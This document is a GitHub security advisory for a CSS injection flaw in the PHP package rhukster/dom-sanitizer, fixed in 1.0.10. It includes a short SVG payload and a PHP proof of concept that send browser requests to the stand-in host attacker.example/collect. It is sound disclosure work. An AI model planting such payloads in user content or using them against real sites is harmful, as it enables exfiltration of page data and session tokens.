# [M] rhukster/dom-sanitizer: SVG <style> tag allows CSS injection via unfiltered url() and @import directives

## Summary
Severity: Medium
Advisory: GHSA-93vf-569f-22cq
CVE: CVE-2026-40301
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-93vf-569f-22cq
Type: github-advisory

## Affected
- Packagist: `rhukster/dom-sanitizer` — affected >=0 <1.0.10

## Details
### Summary
DOMSanitizer::sanitize() allows <style> elements in SVG content but never inspects their text content. CSS url() references and @import rules pass through unfiltered, causing the browser to issue HTTP requests to attacker-controlled hosts when the sanitized SVG is rendered.

### Details
In src/DOMSanitizer.php, 'style' is listed in the SVG allowed-tag array (line 31). The sanitize() method (lines 111–133) removes disallowed tags and strips attributes matching the EXTERNAL_URL pattern — but text node content of <style> elements is never examined. Because CSS rules live in text nodes, EXTERNAL_URL filtering never applies to them.

Vulnerable code (src/DOMSanitizer.php, line 31):
```php
'svg' => ['style', 'path', 'rect', 'circle', ...],
```

The following payload survives sanitize() intact:
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <style>* { background: url(https://attacker.example/collect); }</style>
</svg>
```

### PoC
```php
<?php
require 'vendor/autoload.php';
use Rhukster\DomSanitizer\DOMSanitizer;

$svg = '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: url(https://attacker.example/collect); }</style></svg>';
$sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
$output = $sanitizer->sanitize($svg);
echo $output; // <style> with url() survives unchanged — confirmed exploitable in Statamic CMS (GHSA-g8hv-8w5p-cvqg)
```

Render the returned string in a browser. The browser sends a GET request to https://attacker.example/collect.

### Impact
Any application that passes user-controlled SVG through DOMSanitizer::sanitize() and renders the output in a browser is vulnerable. An attacker can exfiltrate the page URL to an external server, load arbitrary external stylesheets, and on some browsers leverage CSS attribute selectors + url() to exfiltrate cookie or session token values.

## References
- https://github.com/rhukster/dom-sanitizer/security/advisories/GHSA-93vf-569f-22cq
- https://nvd.nist.gov/vuln/detail/CVE-2026-40301
- https://github.com/rhukster/dom-sanitizer/commit/49a98046b708a4c92f754f5b0ef1720bb85142e2
- https://github.com/rhukster/dom-sanitizer
- https://github.com/rhukster/dom-sanitizer/releases/tag/1.0.10
